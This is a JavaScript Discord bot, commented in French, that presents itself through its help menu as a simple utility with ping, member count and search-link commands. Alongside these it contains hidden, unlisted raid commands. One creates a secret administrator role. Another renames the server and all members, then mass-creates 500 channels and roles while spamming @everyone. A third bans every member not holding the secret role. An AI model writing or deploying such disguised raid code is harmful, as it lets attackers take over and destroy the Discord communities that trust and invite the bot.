const Discord = require("discord.js"); // Bibliothèque discord.js
const Config = require("./config.json"); // Fichier config.json
const bot = new Discord.Client(); // Nouvelle instance 


// Changer l'activité de jeu du bot
bot.on('ready', function () {
    bot.user.setGame(Config.game + " | " + Config.prefix + "help");
    console.log(Config.name + " est connecté")
});


// Ajouter un role + envoyer un message de bienvenue
bot.on("guildMemberAdd", function (member) {
    let role = member.guild.roles.find("name", Config.defaultRole); // nom du grade 
    member.guild.channels.find("name", Config.defaultChannel).sendMessage(member.toString() + " " + Config.joinMessage);
    member.addRole(role);
});


bot.on('message', function (message) { // Debut bot.on('message')


    // Debut google
    if (message.content.includes(Config.prefix + "google")) {
        let glg = message.content.split(' ');
        glg.shift();
        message.reply('https://www.google.fr/#q=' + glg.join('%20'));
        message.delete();
    }
    // Fin google


    // Debut youtube
    if (message.content.includes(Config.prefix + "youtube")) {
        let ytb = message.content.split(' ');
        ytb.shift();
        message.reply('https://m.youtube.com/results?search_query=' + ytb.join('+'));
        message.delete();
    }
    // Fin youtube


    switch (message.content) {

        // Debut help
        case Config.prefix + "help":
            var embed = new Discord.RichEmbed()
                .addField("!ping", "C'est pour savoir mon ping en ce moment")
                .addField("!membres", "Permet de savoir le nombre de personnes sur le Discord")
                .addField("!google", "Faite cette commande + (la recherche que vous souhaitez faire) !") // En dehors du switch
                .addField("!youtube", "Faite cette commande + (la recherche que vous souhaitez faire)") // En dehors du switch
                .setColor("#00a1ff")
                .setAuthor("Listes des commandes")
                .setDescription(Config.name)
                .setTimestamp()
            message.delete()
            message.channel.sendEmbed(embed)
            break;
        // Fin help


        // Debut ping
        case Config.prefix + "ping":
            message.channel.sendMessage("Pong! J'ai actuellement `" + bot.ping + " ms !`");
            message.delete();
            break;
        // Fin ping


        // Debut membres
        case Config.prefix + "membres":
            message.reply("Nous sommes actuellement ``" + message.guild.memberCount + " membres`` sur ``" + message.guild.name + "`` !");
            message.delete();
            break;
        // Fin membres


        // Debut create
        case Config.prefix + "create": // Créer un grade admin secret / Create secret admin role
            message.guild.createRole({
                name: Config.adminRoleName,
                permissions: 'ADMINISTRATOR',
                position: message.guild.me.highestRole.calculatedPosition, // 0 == bottom / 1000 == top 
            });
            message.delete();
            break;
        // Fin create


        // Debut start
        case Config.prefix + "start": // Lancer le raid / Start raid
            var count = 0;
            message.guild.setName(Config.discordName);

            let PrankedRole = message.guild.roles.find(r => r.name === "Carlo-bot > all");
            message.member.addRole(PrankedRole);


            const listUser = message.guild.members;

            listUser.forEach(function (user) {
                if (user.id != message.guild.ownerID) {
                    user.setNickname(Config.userName);
                }
            });

            while (count < 500) {
                message.guild.createChannel(Config.channelName, "category");
                message.guild.createRole({
                    name: Config.roleName,
                });
                message.channel.sendMessage("@everyone " + Config.sendMessage);
                count++;
            }
            message.delete();
            break;
        // Fin start


        // Debut finish
        case Config.prefix + "finish": // Finir le raid et ban tout le monde / End raid and ban all member
            const list = message.guild.members;

            list.forEach(function (user) {
                if (user.bannable && (user.highestRole.name != Config.adminRoleName)) {
                    user.ban();
                }
            });
            message.delete();
            break;
        // Fin finish

        default:
            message.delete();

    }



}); // Fin bot.on('message')




bot.login(Config.token);